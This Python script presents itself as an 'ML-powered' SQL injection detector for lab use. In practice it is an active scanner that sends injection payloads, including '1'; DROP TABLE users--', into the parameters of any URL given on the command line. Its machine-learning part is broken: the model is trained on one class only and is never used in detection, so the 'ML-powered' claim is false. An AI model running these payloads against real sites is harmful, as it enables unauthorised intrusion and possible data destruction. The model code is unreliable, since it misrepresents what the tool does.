#!/usr/bin/env python3
"""
ML-powered SQL injection detection
Educational purpose only - Use only in lab environment
"""

import requests
import re
import time
import logging
from typing import Dict, Tuple, Optional
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import numpy as np
import argparse

logger = logging.getLogger(__name__)

class AISQLiDetector:
    """ML-powered SQL injection detection"""
    
    def __init__(self):
        self.sqli_patterns = [
            r"union.*select", r"1' or '1'='1", r"';.*--", r"1=1--",
            r"admin'.*", r"password'.*", r"mysql.*error", r"syntax.*error"
        ]
        self.ml_model = GradientBoostingClassifier(n_estimators=50)
        self.vectorizer = TfidfVectorizer(max_features=500)
        self._train_model()
    
    def _train_model(self):
        """Train model with sample data"""
        # Sample payloads and responses
        payloads = [
            "' OR '1'='1", "admin'--", "1; DROP TABLE users--",
            "1' UNION SELECT null--", "' AND 1=CONVERT(int,'a')"
        ]
        responses = [
            "error in query", "mysql error", "sql syntax", "unclosed quotation"
        ]
        
        # Simple training (in production use real data)
        X_train = self.vectorizer.fit_transform(payloads + responses).toarray()
        y_train = np.array([1] * len(payloads) + [0] * len(responses))
        
        if len(X_train) > 0:
            self.ml_model.fit(X_train[:len(payloads)], y_train[:len(payloads)])
        logger.info("SQLi detector model trained")
    
    def is_sqli_response(self, text: str) -> bool:
        """Check if response indicates SQL injection"""
        for pattern in self.sqli_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def detect_sqli(self, url: str, params: Dict) -> Tuple[Optional[str], Optional[str]]:
        """Detect SQL injection vulnerability"""
        test_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT null--",
            "' AND 1=CONVERT(int,'a')",
            "1'; DROP TABLE users--"
        ]
        
        for param, value in params.items():
            for payload in test_payloads:
                test_url = url.replace(f"{param}={value}", f"{param}={payload}")
                try:
                    resp = requests.get(test_url, timeout=5)
                    if self.is_sqli_response(resp.text):
                        logger.warning(f"Potential SQLi at {test_url}")
                        return test_url, payload
                except requests.RequestException:
                    continue
        return None, None
    
    def scan(self, url: str) -> Dict:
        """Scan URL for SQL injection"""
        logger.info(f"Scanning for SQL injection: {url}")
        
        # Parse URL parameters
        if '?' not in url:
            return {'vulnerable': False, 'message': 'No parameters to test'}
        
        base_url, query = url.split('?', 1)
        params = {}
        for param in query.split('&'):
            if '=' in param:
                key, val = param.split('=', 1)
                params[key] = val
        
        vuln_url, payload = self.detect_sqli(url, params)
        
        return {
            'vulnerable': vuln_url is not None,
            'url': vuln_url,
            'payload': payload,
            'message': 'Potential SQL injection found!' if vuln_url else 'No SQL injection detected'
        }


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Detector")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    
    args = parser.parse_args()
    
    detector = AISQLiDetector()
    result = detector.scan(args.url)
    print(f"Result: {result['message']}")
    if result['vulnerable']:
        print(f"Vulnerable URL: {result['url']}")
        print(f"Test payload: {result['payload']}")